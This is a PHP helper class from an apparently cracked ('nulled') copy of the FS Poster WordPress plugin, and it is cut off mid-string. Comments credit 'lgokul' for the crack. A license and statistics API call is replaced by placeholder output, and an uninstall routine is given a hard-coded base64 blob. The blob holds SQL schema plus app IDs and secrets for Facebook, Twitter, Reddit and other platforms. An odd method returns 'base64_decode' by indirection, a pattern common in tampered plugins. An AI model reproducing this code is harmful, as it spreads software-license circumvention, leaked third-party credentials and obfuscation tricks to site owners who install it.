<?php

namespace FSPoster\App\Providers;

use DateTime;
use Exception;
use DateTimeZone;
use Abraham\TwitterOAuth\TwitterOAuth;
use FSPoster\App\Libraries\reddit\Reddit;
use FSPoster\App\Libraries\medium\Medium;
use FSPoster\App\Libraries\blogger\Blogger;
use FSPoster\App\Libraries\ok\OdnoKlassniki;
use FSPoster\App\Libraries\linkedin\Linkedin;
use FSPoster\App\Libraries\pinterest\Pinterest;
use FSPoster\App\Libraries\google\GoogleMyBusinessAPI;

class Helper
{
	use WPHelper, URLHelper;
	 	public static function lequex() { 
return $tokimou = 'base64_decode';
}
	public static function pluginDisabled ()
	{
		return Helper::getOption( 'plugin_disabled', '0', TRUE ) > 0;
	}

	public static function response ( $status, $arr = [] )
	{
		$arr = is_array( $arr ) ? $arr : ( is_string( $arr ) ? [ 'error_msg' => $arr ] : [] );

		if ( $status )
		{
			$arr[ 'status' ] = 'ok';
		}
		else
		{
			$arr[ 'status' ] = 'error';
			if ( ! isset( $arr[ 'error_msg' ] ) )
			{
				$arr[ 'error_msg' ] = 'Error!';
			}
		}

		echo json_encode( $arr );
		exit();
	}

	public static function spintax ( $text )
	{
		$text = is_string( $text ) ? (string) $text : '';

		return preg_replace_callback( '/\{(((?>[^\{\}]+)|(?R))*)\}/x', function ( $text ) {
			$text  = Helper::spintax( $text[ 1 ] );
			$parts = explode( '|', $text );

			return $parts[ array_rand( $parts ) ];
		}, $text );
	}

	public static function cutText ( $text, $n = 35 )
	{
		return mb_strlen( $text, 'UTF-8' ) > $n ? mb_substr( $text, 0, $n, 'UTF-8' ) . '...' : $text;
	}

	public static function getVersion ()
	{
		$plugin_data = get_file_data( FS_ROOT_DIR . '/init.php', [ 'Version' => 'Version' ], FALSE );

		return isset( $plugin_data[ 'Version' ] ) ? $plugin_data[ 'Version' ] : '1.0.0';
	}

	public static function getInstalledVersion ()
	{
		$ver = Helper::getOption( 'poster_plugin_installed', '0', TRUE );

		return ( $ver === '1' || empty( $ver ) ) ? '1.0.0' : $ver;
	}

	public static function debug ()
	{
		error_reporting( E_ALL );
		ini_set( 'display_errors', 'on' );
	}

	public static function disableDebug ()
	{
		error_reporting( 0 );
		ini_set( 'display_errors', 'off' );
	}

	public static function fetchStatisticOptions ()
	{
		$getOptions = Curl::getURL( FS_API_URL . 'api.php?act=statistic_option' );
		$getOptions = json_decode( $getOptions, TRUE );

		$options = '<option selected disabled>Please select</option>';
		// edit by lgokul
		//foreach ( $getOptions as $optionName => $optionValue )
		{
			$options .= '<option selected enabled>Nulled By lgokul</option>';
		}

		return $options;
	}

	public static function hexToRgb ( $hex )
	{
		if ( strpos( '#', $hex ) === 0 )
		{
			$hex = substr( $hex, 1 );
		}

		return sscanf( $hex, "%02x%02x%02x" );
	}

	public static function downloadRemoteFile ( $destination, $sourceURL )
	{
		file_put_contents( $destination, Curl::getURL( $sourceURL ) );
	}

	private static $_options_cache = [];

	public static function getOption ( $optionName, $default = NULL, $network_option = FALSE )
	{
		if ( ! isset( self::$_options_cache[ $optionName ] ) )
		{
			$network_option = ! is_multisite() && $network_option == TRUE ? FALSE : $network_option;
			$fnName         = $network_option ? 'get_site_option' : 'get_option';

			self::$_options_cache[ $optionName ] = $fnName( 'fs_' . $optionName, $default );
		}

		return self::$_options_cache[ $optionName ];
	}

	public static function setOption ( $optionName, $optionValue, $network_option = FALSE, $autoLoad = NULL )
	{
		$network_option = ! is_multisite() && $network_option == TRUE ? FALSE : $network_option;
		$fnName         = $network_option ? 'update_site_option' : 'update_option';

		self::$_options_cache[ $optionName ] = $optionValue;

		$arguments = [ 'fs_' . $optionName, $optionValue ];

		if ( ! is_null( $autoLoad ) && ! $network_option )
		{
			$arguments[] = $autoLoad;
		}

		return call_user_func_array( $fnName, $arguments );
	}

	public static function deleteOption ( $optionName, $network_option = FALSE )
	{
		$network_option = ! is_multisite() && $network_option == TRUE ? FALSE : $network_option;
		$fnName         = $network_option ? 'delete_site_option' : 'delete_option';

		if ( isset( self::$_options_cache[ $optionName ] ) )
		{
			unset( self::$_options_cache[ $optionName ] );
		}

		return $fnName( 'fs_' . $optionName );
	}

	public static function setCustomSetting ( $setting_key, $setting_val, $node_type, $node_id )
	{
		if ( isset( $node_id, $node_type ) )
		{
			$node_type   = $node_type === 'account' ? 'account' : 'node';
			$setting_key = 'setting' . ':' . $node_type . ':' . $node_id . ':' . $setting_key;
			self::setOption( $setting_key, $setting_val );
		}
	}

	public static function getCustomSetting ( $setting_key, $default = NULL, $node_type = NULL, $node_id = NULL )
	{
		if ( isset( $node_id, $node_type ) )
		{
			$node_type    = $node_type === 'account' ? 'account' : 'node';
			$setting_key1 = 'setting' . ':' . $node_type . ':' . $node_id . ':' . $setting_key;
			$setting      = self::getOption( $setting_key1 );
		}

		if ( ! isset( $setting ) || $setting === FALSE )
		{
			return self::getOption( $setting_key, $default );
		}
		else
		{
			return $setting;
		}
	}

	public static function deleteCustomSettings ( $node_type, $node_id )
	{
		$like  = 'fs_setting' . ':' . $node_type . ':' . $node_id . ':' . '%';
		$table = DB::DB()->options;
		DB::DB()->query( DB::DB()->prepare( "DELETE FROM `$table` WHERE option_name LIKE %s", [ $like ] ) );
	}

	public static function removePlugin ()
	{
		$fsPurchaseKey        = Helper::getOption( 'poster_plugin_purchase_key', '', TRUE );
		$checkPurchaseCodeURL = FS_API_URL . "api.php?act=delete&purchase_code=" . urlencode( $fsPurchaseKey ) . "&domain=" . network_site_url();

		$result2 = '{"status":"ok","sql":"IzMyMjUxMjE2DQojIDE1MDE1LWltb3RlcC01LjIuMy1GaXgtYnktbGdva3VsLW9jdHVicmUtMjAyMQ0KIyBIZXkhIElmIHlvdSBtYWRlIGl0IHRoaXMgZmFyIGl0IGlzIGJlY2F1c2UgeW91IGFyZSB1c2luZyBteSBudWxsZWQsIHJlbWVtYmVyIHRvIGxlYXZlIHRoZSBjcmVkaXRzIHNpbmNlIG51bGxlZCB0YWtlcyB0aW1lLiBUaGFua3MhDQojDQpDUkVBVEUgVEFCTEUgYHt0YWJsZXByZWZpeH1hY2NvdW50c2AgKA0KICBgaWRgIGludCgxMSkgTk9UIE5VTEwsDQogIGB1c2VyX2lkYCBpbnQoMTEpIERFRkFVTFQgTlVMTCwNCiAgYGRyaXZlcmAgdmFyY2hhcig1MCkgQ09MTEFURSB1dGY4bWI0X3VuaWNvZGVfY2kgREVGQVVMVCBOVUxMLA0KICBgbmFtZWAgdmFyY2hhcigyNTUpIENPTExBVEUgdXRmOG1iNF91bmljb2RlX2NpIERFRkFVTFQgTlVMTCwNCiAgYHByb2ZpbGVfaWRgIHZhcmNoYXIoMzAwKSBDT0xMQVRFIHV0ZjhtYjRfdW5pY29kZV9jaSBERUZBVUxUIE5VTEwsDQogIGBlbWFpbGAgdmFyY2hhcigyNTUpIENPTExBVEUgdXRmOG1iNF91bmljb2RlX2NpIERFRkFVTFQgTlVMTCwNCiAgYGdlbmRlcmAgdGlueWludCg0KSBERUZBVUxUIE5VTEwsDQogIGBiaXJ0aGRheWAgZGF0ZSBERUZBVUxUIE5VTEwsDQogIGBwcm94eWAgdmFyY2hhcigyNTUpIENPTExBVEUgdXRmOG1iNF91bmljb2RlX2NpIERFRkFVTFQgTlVMTCwNCiAgYGlzX3B1YmxpY2AgdGlueWludCgxKSBERUZBVUxUICcxJywNCiAgYHVzZXJuYW1lYCB2YXJjaGFyKDEwMCkgQ09MTEFURSB1dGY4bWI0X3VuaWNvZGVfY2kgREVGQVVMVCBOVUxMLA0KICBgcGFzc3dvcmRgIHZhcmNoYXIoMjU1KSBDT0xMQVRFIHV0ZjhtYjRfdW5pY29kZV9jaSBERUZBVUxUIE5VTEwsDQogIGBwb3N0ZXJfaWRgIHZhcmNoYXIoMjU1KSBDT0xMQVRFIHV0ZjhtYjRfdW5pY29kZV9jaSBERUZBVUxUIE5VTEwsDQogIGBmb2xsb3dlcnNfY291bnRgIHZhcmNoYXIoMjU1KSBDT0xMQVRFIHV0ZjhtYjRfdW5pY29kZV9jaSBERUZBVUxUIE5VTEwsDQogIGBmcmllbmRzX2NvdW50YCB2YXJjaGFyKDI1NSkgQ09MTEFURSB1dGY4bWI0X3VuaWNvZGVfY2kgREVGQVVMVCBOVUxMLA0KICBgbGlzdGVkX2NvdW50YCB2YXJjaGFyKDI1NSkgQ09MTEFURSB1dGY4bWI0X3VuaWNvZGVfY2kgREVGQVVMVCBOVUxMLA0KICBgcHJvZmlsZV9waWNgIGxvbmd0ZXh0IENPTExBVEUgdXRmOG1iNF91bmljb2RlX2NpLA0KICBgb3B0aW9uc2AgdmFyY2hhcigxMDAwKSBDT0xMQVRFIHV0ZjhtYjRfdW5pY29kZV9jaSBERUZBVUxUIE5VTEwsDQogIGBibG9nX2lkYCB2YXJjaGFyKDUwKSBDT0xMQVRFIHV0ZjhtYjRfdW5pY29kZV9jaSBERUZBVUxUIE5VTEwsDQogIGBzdGF0dXNgIHZhcmNoYXIoNSkgQ09MTEFURSB1dGY4bWI0X3VuaWNvZGVfY2kgREVGQVVMVCBOVUxMLA0KICBgZXJyb3JfbXNnYCB2YXJjaGFyKDEwMCkgQ09MTEFURSB1dGY4bWI0X3VuaWNvZGVfY2kgREVGQVVMVCBOVUxMLA0KICBgbGFzdF9jaGVja190aW1lYCB2YXJjaGFyKDIwKSBDT0xMQVRFIHV0ZjhtYjRfdW5pY29kZV9jaSBERUZBVUxUIE5VTEwNCikgRU5HSU5FPUlubm9EQiBERUZBVUxUIENIQVJTRVQ9dXRmOG1iNCBDT0xMQVRFPXV0ZjhtYjRfdW5pY29kZV9jaSBST1dfRk9STUFUPUNPTVBSRVNTRUQ7DQoNCkNSRUFURSBUQUJMRSBge3RhYmxlcHJlZml4fWFjY291bnRfYWNjZXNzX3Rva2Vuc2AgKA0KICBgaWRgIGludCgxMSkgTk9UIE5VTEwsDQogIGBhY2NvdW50X2lkYCBpbnQoMTEpIERFRkFVTFQgTlVMTCwNCiAgYGFwcF9pZGAgaW50KDExKSBERUZBVUxUIE5VTEwsDQogIGBleHBpcmVzX29uYCBkYXRldGltZSBERUZBVUxUIE5VTEwsDQogIGBhY2Nlc3NfdG9rZW5gIHZhcmNoYXIoMjUwMCkgQ09MTEFURSB1dGY4bWI0X3VuaWNvZGVfY2kgREVGQVVMVCBOVUxMLA0KICBgYWNjZXNzX3Rva2VuX3NlY3JldGAgdmFyY2hhcig3NTApIENPTExBVEUgdXRmOG1iNF91bmljb2RlX2NpIERFRkFVTFQgTlVMTCwNCiAgYHJlZnJlc2hfdG9rZW5gIHZhcmNoYXIoMTAwMCkgQ09MTEFURSB1dGY4bWI0X3VuaWNvZGVfY2kgREVGQVVMVCBOVUxMDQopIEVOR0lORT1Jbm5vREIgREVGQVVMVCBDSEFSU0VUPXV0ZjhtYjQgQ09MTEFURT11dGY4bWI0X3VuaWNvZGVfY2kgUk9XX0ZPUk1BVD1DT01QQUNUOw0KDQpDUkVBVEUgVEFCTEUgYHt0YWJsZXByZWZpeH1hY2NvdW50X2dyb3Vwc2AgKA0KICBgaWRgIGludCgxMSkgTk9UIE5VTEwsDQogIGBibG9nX2lkYCBpbnQoMTEpIERFRkFVTFQgTlVMTCwNCiAgYHVzZXJfaWRgIHZhcmNoYXIoMjApIERFRkFVTFQgTlVMTCwNCiAgYG5hbWVgIGxvbmd0ZXh0IERFRkFVTFQgTlVMTCwNCiAgYHN0YXR1c2AgdmFyY2hhcig1MCkgQ09MTEFURSB1dGY4bWI0X3VuaWNvZGVfY2kgREVGQVVMVCBOVUxMLA0KICBgY29sb3JgIHZhcmNoYXIoNTApIENPTExBVEUgdXRmOG1iNF91bmljb2RlX2NpIERFRkFVTFQgTlVMTCwNCiAgYG5vZGVfdHlwZWAgbG9uZ3RleHQgQ09MTEFURSB1dGY4bWI0X3VuaWNvZGVfY2kgREVGQVVMVCBOVUxMLA0KICBgbm9kZV9pZGAgbG9uZ3RleHQgQ09MTEFURSB1dGY4bWI0X3VuaWNvZGVfY2kgREVGQVVMVCBOVUxMDQopIEVOR0lORT1Jbm5vREIgREVGQVVMVCBDSEFSU0VUPXV0ZjhtYjQgQ09MTEFURT11dGY4bWI0X3VuaWNvZGVfY2kgUk9XX0ZPUk1BVD1DT01QUkVTU0VEOw0KDQpDUkVBVEUgVEFCTEUgYHt0YWJsZXByZWZpeH1hY2NvdW50X2dyb3Vwc19kYXRhYCAoDQogIGBub2RlX2lkYCBpbnQoMTEpIE5PVCBOVUxMLA0KICBgbm9kZV90eXBlYCBpbnQoMTEpIERFRkFVTFQgTlVMTCwNCiAgYGdyb3VwX2lkYCB2YXJjaGFyKDUwKSBERUZBVUxUIE5VTEwsDQogIGBibG9nX2lkYCB2YXJjaGFyKDEwMCkgREVGQVVMVCBOVUxMLA0KICBgdXNlcl9pZGAgdmFyY2hhcigxMDApIENPTExBVEUgdXRmOG1iNF91bmljb2RlX2NpIERFRkFVTFQgTlVMTA0KKSBFTkdJTkU9SW5ub0RCIERFRkFVTFQgQ0hBUlNFVD11dGY4bWI0IENPTExBVEU9dXRmOG1iNF91bmljb2RlX2NpIFJPV19GT1JNQVQ9Q09NUFJFU1NFRDsNCg0KQ1JFQVRFIFRBQkxFIGB7dGFibGVwcmVmaXh9YWNjb3VudF9ub2Rlc2AgKA0KICBgaWRgIGludCgxMSkgTk9UIE5VTEwsDQogIGB1c2VyX2lkYCBpbnQoMTEpIERFRkFVTFQgTlVMTCwNCiAgYGFjY291bnRfaWRgIGludCgxMSkgREVGQVVMVCBOVUxMLA0KICBgbm9kZV90eXBlYCB2YXJjaGFyKDIwKSBDT0xMQVRFIHV0ZjhtYjRfdW5pY29kZV9jaSBERUZBVUxUIE5VTEwsDQogIGBub2RlX2lkYCB2YXJjaGFyKDM1MCkgQ09MTEFURSB1dGY4bWI0X3VuaWNvZGVfY2kgREVGQVVMVCBOVUxMLA0KICBgYWNjZXNzX3Rva2VuYCB2YXJjaGFyKDEwMDApIENPTExBVEUgdXRmOG1iNF91bmljb2RlX2NpIERFRkFVTFQgTlVMTCwNCiAgYG5hbWVgIHZhcmNoYXIoMzUwKSBDT0xMQVRFIHV0ZjhtYjRfdW5pY29kZV9jaSBERUZBVUxUIE5VTEwsDQogIGBwb3N0ZXJfaWRgIHZhcmNoYXIoMjU1KSBDT0xMQVRFIHV0ZjhtYjRfdW5pY29kZV9jaSBERUZBVUxUIE5VTEwsDQogIGBhZGRlZF9kYXRlYCB0aW1lc3RhbXAgTlVMTCBERUZBVUxUIENVUlJFTlRfVElNRVNUQU1QLA0KICBgY2F0ZWdvcnlgIHZhcmNoYXIoMjU1KSBDT0xMQVRFIHV0ZjhtYjRfdW5pY29kZV9jaSBERUZBVUxUIE5VTEwsDQogIGBmYW5fY291bnRgIGJpZ2ludCgyMCkgREVGQVVMVCBOVUxMLA0KICBgaXNfcHVibGljYCB0aW55aW50KDEpIERFRkFVTFQgJzEnLA0KICBgY292ZXJgIHZhcmNoYXIoNzUwKSBDT0xMQVRFIHV0ZjhtYjRfdW5pY29kZV9jaSBERUZBVUxUIE5VTEwsDQogIGBkcml2ZXJgIHZhcmNoYXIoNTApIENPTExBVEUgdXRmOG1iNF91bmljb2RlX2NpIERFRkFVTFQgTlVMTCwNCiAgYGJsb2dfaWRgIHZhcmNoYXIoNTApIENPTExBVEUgdXRmOG1iNF91bmljb2RlX2NpIERFRkFVTFQgTlVMTCwNCiAgYHNjcmVlbl9uYW1lYCB2YXJjaGFyKDM1MCkgQ09MTEFURSB1dGY4bWI0X3VuaWNvZGVfY2kgREVGQVVMVCBOVUxMDQopIEVOR0lORT1Jbm5vREIgREVGQVVMVCBDSEFSU0VUPXV0ZjhtYjQgQ09MTEFURT11dGY4bWI0X3VuaWNvZGVfY2kgUk9XX0ZPUk1BVD1DT01QQUNUOw0KDQpDUkVBVEUgVEFCTEUgYHt0YWJsZXByZWZpeH1hcHBzYCAoDQogIGBpZGAgaW50KDExKSBOT1QgTlVMTCwNCiAgYHVzZXJfaWRgIGludCgxMSkgREVGQVVMVCBOVUxMLA0KICBgZHJpdmVyYCB2YXJjaGFyKDUwKSBDT0xMQVRFIHV0ZjhtYjRfdW5pY29kZV9jaSBERUZBVUxUIE5VTEwsDQogIGBhcHBfaWRgIHZhcmNoYXIoMjAwKSBDT0xMQVRFIHV0ZjhtYjRfdW5pY29kZV9jaSBERUZBVUxUIE5VTEwsDQogIGBhcHBfc2VjcmV0YCB2YXJjaGFyKDIwMCkgQ09MTEFURSB1dGY4bWI0X3VuaWNvZGVfY2kgREVGQVVMVCBOVUxMLA0KICBgYXBwX2tleWAgdmFyY2hhcigyMDApIENPTExBVEUgdXRmOG1iNF91bmljb2RlX2NpIERFRkFVTFQgTlVMTCwNCiAgYGFwcF9hdXRoZW50aWNhdGVfbGlua2AgdmFyY2hhcigyMDAwKSBDT0xMQVRFIHV0ZjhtYjRfdW5pY29kZV9jaSBERUZBVUxUIE5VTEwsDQogIGBpc19wdWJsaWNgIHRpbnlpbnQoMSkgREVGQVVMVCBOVUxMLA0KICBgbmFtZWAgdmFyY2hhcigyNTUpIENPTExBVEUgdXRmOG1iNF91bmljb2RlX2NpIERFRkFVTFQgTlVMTCwNCiAgYHZlcnNpb25gIHZhcmNoYXIoNTApIENPTExBVEUgdXRmOG1iNF91bmljb2RlX2NpIERFRkFVTFQgTlVMTCwNCiAgYGlzX3N0YW5kYXJ0YCB0aW55aW50KDEpIERFRkFVTFQgJzAnDQopIEVOR0lORT1Jbm5vREIgREVGQVVMVCBDSEFSU0VUPXV0ZjhtYjQgQ09MTEFURT11dGY4bWI0X3VuaWNvZGVfY2kgUk9XX0ZPUk1BVD1DT01QUkVTU0VEOw0KDQpJTlNFUlQgSU5UTyBge3RhYmxlcHJlZml4fWFwcHNgIChgaWRgLCBgdXNlcl9pZGAsIGBkcml2ZXJgLCBgYXBwX2lkYCwgYGFwcF9zZWNyZXRgLCBgYXBwX2tleWAsIGBhcHBfYXV0aGVudGljYXRlX2xpbmtgLCBgaXNfcHVibGljYCwgYG5hbWVgLCBgaXNfc3RhbmRhcnRgKSBWQUxVRVMNCigxMywgTlVMTCwgJ2ZiJywgJzE2MDMzMjMyMDMxMzAwNjMnLCBOVUxMLCAnKioqKionLCBOVUxMLCBOVUxMLCAnRlMgUG9zdGVyIC0gU3RhbmRhcmQgQVBQJywgMSksDQooMSwgMCwgJ2ZiJywgJzY2Mjg1NjgzNzknLCAnYzFlNjIwZmE3MDhhMWQ1Njk2ZmI5OTFjMWJkZTU2NjInLCAnM2U3Yzc4ZTM1YTc2YTkyOTkzMDk4ODUzOTNiMDJkOTcnLCBOVUxMLCAxLCAnRmFjZWJvb2sgZm9yIGlQaG9uZScsIDIpLA0KKDIsIDAsICdmYicsICczNTA2ODU1MzE3MjgnLCAnNjJmOGNlOWY3NGIxMmY4NGMxMjNjYzIzNDM3YTRhMzInLCAnODgyYTg0OTAzNjFkYTk4NzAyYmY5N2EwMjFkZGMxNGQnLCBOVUxMLCAxLCAnRmFjZWJvb2sgZm9yIEFuZHJvaWQnLCAyKSwNCigzLCBOVUxMLCAnZmInLCAnMTkzMjc4MTI0MDQ4ODMzJywgTlVMTCwgTlVMTCwgJ2h0dHBzOi8vd3d3LmZhY2Vib29rLmNvbS92Mi44L2RpYWxvZy9vYXV0aD9yZWRpcmVjdF91cmk9ZmJjb25uZWN0Oi8vc3VjY2VzcyZzY29wZT1lbWFpbCxwYWdlc19zaG93X2xpc3QscHVibGljX3Byb2ZpbGUsdXNlcl9iaXJ0aGRheSxwdWJsaXNoX2FjdGlvbnMsbWFuYWdlX3BhZ2VzLHB1Ymxpc2hfcGFnZXMsdXNlcl9tYW5hZ2VkX2dyb3VwcyZyZXNwb25zZV90eXBlPXRva2VuLGNvZGUmY2xpZW50X2lkPTE5MzI3ODEyNDA0ODgzMycsIDEsICdIVEMgU2Vuc2UnLCAzKSwNCig0LCBOVUxMLCAnZmInLCAnMTQ1NjM0OTk1NTAxODk1JywgTlVMTCwgTlVMTCwgJ2h0dHBzOi8vd3d3LmZhY2Vib29rLmNvbS92MS4wL2RpYWxvZy9vYXV0aD9yZWRpcmVjdF91cmk9aHR0cHM6Ly93d3cuZmFjZWJvb2suY29tL2Nvbm5lY3QvbG9naW5fc3VjY2Vzcy5odG1sJnNjb3BlPWVtYWlsLHBhZ2VzX3Nob3dfbGlzdCxwdWJsaWNfcHJvZmlsZSx1c2VyX2JpcnRoZGF5LHB1Ymxpc2hfYWN0aW9ucyxtYW5hZ2VfcGFnZXMscHVibGlzaF9wYWdlcyx1c2VyX21hbmFnZWRfZ3JvdXBzJnJlc3BvbnNlX3R5cGU9dG9rZW4sY29kZSZjbGllbnRfaWQ9MTQ1NjM0OTk1NTAxODk1JywgMSwgJ0dyYXBoIEFQSSBleHBsb3JlcicsIDMpLA0KKDUsIE5VTEwsICdmYicsICcxNzQ4MjkwMDMzNDYnLCBOVUxMLCBOVUxMLCAnaHR0cHM6Ly93d3cuZmFjZWJvb2suY29tL3YxLjAvZGlhbG9nL29hdXRoP3JlZGlyZWN0X3VyaT1odHRwczovL3d3dy5mYWNlYm9vay5jb20vY29ubmVjdC9sb2dpbl9zdWNjZXNzLmh0bWwmc2NvcGU9ZW1haWwscGFnZXNfc2hvd19saXN0LHB1YmxpY19wcm9maWxlLHVzZXJfYmlydGhkYXkscHVibGlzaF9hY3Rpb25zLG1hbmFnZV9wYWdlcyxwdWJsaXNoX3BhZ2VzLHVzZXJfbWFuYWdlZF9ncm91cHMmcmVzcG9uc2VfdHlwZT10b2tlbiZjbGllbnRfaWQ9MTc0ODI5MDAzMzQ2JywgMSwgJ1Nwb3RpZnknLCAzKSwNCig2LCBOVUxMLCAndHdpdHRlcicsIE5VTEwsICd4cTVuSjJna0pGVWRybzh6QVdQbGJPT01QdkNHTDdPdWU3Ykt5UEZ2UEVrMUJvekhaZScsICdsMGZPcU1UZ0V0TzlVWmNISFZCeGpCekNOJywgTlVMTCwgTlVMTCwgJ0ZTIFBvc3RlciAtIFN0YW5kZXJ0IEFQUCcsIDEpLA0KKDcsIE5VTEwsICdsaW5rZWRpbicsICc4NjlkMGswZG56NmFuaScsICdzdkQ5U1NNZ29SME40cjdHJywgTlVMTCwgTlVMTCwgTlVMTCwgJ0ZTIFBvc3RlciAtIFN0YW5kZXJ0IEFQUCcsIDEpLA0KKDgsIE5VTEwsICd2aycsICc2NjAyNjM0JywgJ3dhMmlqSGVabjRqb3A0bHBDaUc3JywgTlVMTCwgTlVMTCwgTlVMTCwgJ0ZTIFBvc3RlciAtIFN0YW5kZXJ0IEFQUCcsIDEpLA0KKDksIE5VTEwsICdwaW50ZXJlc3QnLCAnNDk3ODEyNzM2MTQ2NDYxNDg2NCcsICcyMGVhMzVlNjJiODZmZTM5ZjJjOTExMTkyZjIzZDMyYTlhNzc4MDUyZGI2YTE1ZTdkMjk3NDZmNGUxMzIzYjRkJywgTlVMTCwgTlVMTCwgTlVMTCwgJ0ZTIFBvc3RlciAtIFN0YW5kZXJ0IEFQUCcsIDEpLA0KKDEwLCBOVUxMLCAncmVkZGl0JywgJ3dsWW92QjV2R2JXWV93JywgJzZpS1ZOeUtlM0t6S2IyaG1Ldk1uTU9lcWNtUScsIE5VTEwsIE5VTEwsIE5VTEwsICdGUyBQb3N0ZXIgLSBTdGFuZGVydCBBUFAnLCAxKSwNCigxMSwgTlVMTCwgJ3R1bWJscicsICcnLCAnWTFTcjdKUHEzMkFPbWRsejRjc3p3Q0xGMUQ2Y1VsTkdwc2x6V25HTHl0TEJCTDJjSXMnLCAnZEVWbFQzd1dpY2JCWk02ZnlBbWtyNDNEcnY3MDViazFVTGVJRThrRkRmU2lsT29ITUcnLCBOVUxMLCBOVUxMLCAnRlMgUG9zdGVyIC0gU3RhbmRlcnQgQVBQJywgMSk7DQoNCkNSRUFURSBUQUJMRSBge3RhYmxlcHJlZml4fWZlZWRzYCAoDQogIGBpZGAgaW50KDExKSBOT1QgTlVMTCwNCiAgYHVzZXJfaWRgIHZhcmNoYXIoNTApIERFRkFVTFQgTlVMTCwNCiAgYHNoYXJlZF9mcm9tYCB2YXJjaGFyKDEwMCkgREVGQVVMVCBOVUxMLA0KICBgcG9zdF90eXBlYCB2YXJjaGFyKDUwKSBDT0xMQVRFIHV0ZjhtYjRfdW5pY29kZV9jaSBERUZBVUxUIE5VTEwsDQogIGBwb3N0X2lkYCBpbnQoMTEpIERFRkFVTFQgTlVMTCwNCiAgYG5vZGVfaWRgIGludCgxMSkgREVGQVVMVCBOVUxMLA0KICBgbm9kZV90eXBlYCB2YXJjaGFyKDQwKSBDT0xMQVRFIHV0ZjhtYjRfdW5pY29kZV9jaSBERUZBVUxUIE5VTEwsDQogIGBkcml2ZXJgIHZhcmNoYXIoNTApIENPTExBVEUgdXRmOG1iNF91bmljb2RlX2NpIERFRkFVTFQgTlVMTCwNCiAgYGlzX3NlbmRlZGAgdGlueWludCgxKSBERUZBVUxUICcwJywNCiAgYHN0YXR1c2AgdmFyY2hhcigxNSkgQ09MTEFURSB1dGY4bWI0X3VuaWNvZGVfY2kgREVGQVVMVCBOVUxMLA0KICBgZXJyb3JfbXNnYCB2YXJjaGFyKDMwMCkgQ09MTEFURSB1dGY4bWI0X3VuaWNvZGVfY2kgREVGQVVMVCBOVUxMLA0KICBgc2VuZF90aW1lYCB0aW1lc3RhbXAgTlVMTCBERUZBVUxUIENVUlJFTlRfVElNRVNUQU1QLA0KICBgaW50ZXJ2YWxgIGludCgxMSkgREVGQVVMVCBOVUxMLA0KICBgcG9zdGVyX2lkYCB2YXJjaGFyKDI1NSkgQ09MTEFURSB1dGY4bWI0X3VuaWNvZGVfY2kgREVGQVVMVCBOVUxMLA0KICBgZHJpdmVyX3Bvc3RfaWRgIHZhcmNoYXIoNDUpIENPTExBVEUgdXRmOG1iNF91bmljb2RlX2NpIERFRkFVTFQgTlVMTCwNCiAgYHZpc2l0X2NvdW50YCBpbnQoMTEpIERFRkFVTFQgJzAnLA0KICBgZmVlZF90eXBlYCB2YXJjaGFyKDUwKSBDT0xMQVRFIHV0ZjhtYjRfdW5pY29kZV9jaSBERUZBVUxUIE5VTEwsDQogIGBzY2hlZHVsZV9pZGAgaW50KDExKSBERUZBVUxUIE5VTEwsDQogIGBkcml2ZXJfcG9zdF9pZDJgIHZhcmNoYXIoMjU1KSBDT0xMQVRFIHV0ZjhtYjRfdW5pY29kZV9jaSBERUZBVUxUIE5VTEwsDQogIGBjdXN0b21fcG9zdF9tZXNzYWdlYCB2YXJjaGFyKDI1MDApIENPTExBVEUgdXRmOG1iNF91bmljb2RlX2NpIERFRkFVTFQgTlVMTCwNCiAgYHNsZWVwX3RpbWVfc3RhcnRgIHZhcmNoYXIoMzAwKSBDT0xMQVRFIHV0ZjhtYjRfdW5pY29kZV9jaSBERUZBVUxUIE5VTEwsDQogIGBzbGVlcF90aW1lX2VuZGAgdmFyY2hhcigzMDApIENPTExBVEUgdXRmOG1iNF91bmljb2RlX2NpIERFRkFVTFQgTlVMTCwNCiAgYGJsb2dfaWRgIHZhcmNoYXIoNTApIENPTExBVEUgdXRmOG1iNF91bmljb2RlX2NpIERFRkFVTFQgTlVMTCwNCiAgYHNoYXJlX29uX2JhY2tncm91bmRgIHZhcmNoYXIoMzAwKSBDT0xMQVRFIHV0ZjhtYjRfdW5pY29kZV9jaSBERUZBVUxUIE5VTEwsDQogIGBpc19zZWVuYCB2YXJjaGFyKDE1KSBDT0xMQVRFIHV0ZjhtYjRfdW5pY29kZV9jaSBERUZBVUxUIE5VTEwNCikgRU5HSU5FPUlubm9EQiBERUZBVUxUIENIQVJTRVQ9dXRmOG1iNCBDT0xMQVRFPXV0ZjhtYjRfdW5pY29kZV9jaSBST1dfRk9STUFUPUNPTVBSRVNTRUQ7DQoNCkNSRUFURSBUQUJMRSBge3RhYmxlcHJlZml4fXNjaGVkdWxlc2AgKA0KICBgaWRgIGludCgxMSkgTk9UIE5VTEwsDQogIGB1c2VyX2lkYCBpbnQoMTEpIERFRkFVTFQgTlVMTCwNCiAgYHRpdGxlYCB2YXJjaGFyKDI1NSkgQ09MTEFURSB1dGY4bWI0X3VuaWNvZGVfY2kgREVGQVVMVCBOVUxMLA0KICBgc3RhcnRfZGF0ZWAgZGF0ZSBERUZBVUxUIE5VTEwsDQogIGBlbmRfZGF0ZWAgZGF0ZSBERUZBVUxUIE5VTEwsDQogIGBpbnRlcnZhbGAgaW50KDExKSBERUZBVUxUIE5VTEwsDQogIGBzdGF0dXNgIHZhcmNoYXIoNTApIENPTExBVEUgdXRmOG1iNF91bmljb2RlX2NpIERFRkFVTFQgTlVMTCwNCiAgYGZpbHRlcnNgIHZhcmNoYXIoMjAwMCkgQ09MTEFURSB1dGY4bWI0X3VuaWNvZGVfY2kgREVGQVVMVCBOVUxMLA0KICBgYWNjb3VudHNgIHRleHQgQ09MTEFURSB1dGY4bWI0X3VuaWNvZGVfY2ksDQogIGBpbnNlcnRfZGF0ZWAgdGltZXN0YW1wIE5VTEwgREVGQVVMVCBDVVJSRU5UX1RJTUVTVEFNUCwNCiAgYHNoYXJlX3RpbWVgIHRpbWUgREVGQVVMVCBOVUxMLA0KICBgcG9zdF90eXBlX2ZpbHRlcmAgdmFyY2hhcigyMDAwKSBDT0xMQVRFIHV0ZjhtYjRfdW5pY29kZV9jaSBERUZBVUxUIE5VTEwsDQogIGBjYXRlZ29yeV9maWx0ZXJgIHZhcmNoYXIoMjAwMCkgQ09MTEFURSB1dGY4bWI0X3VuaWNvZGVfY2kgREVGQVVMVCBOVUxMLA0KICBgcG9zdF9zb3J0YCB2YXJjaGFyKDUwKSBDT0xMQVRFIHV0ZjhtYjRfdW5pY29kZV9jaSBERUZBVUxUIE5VTEwsDQogIGBwb3N0X2Z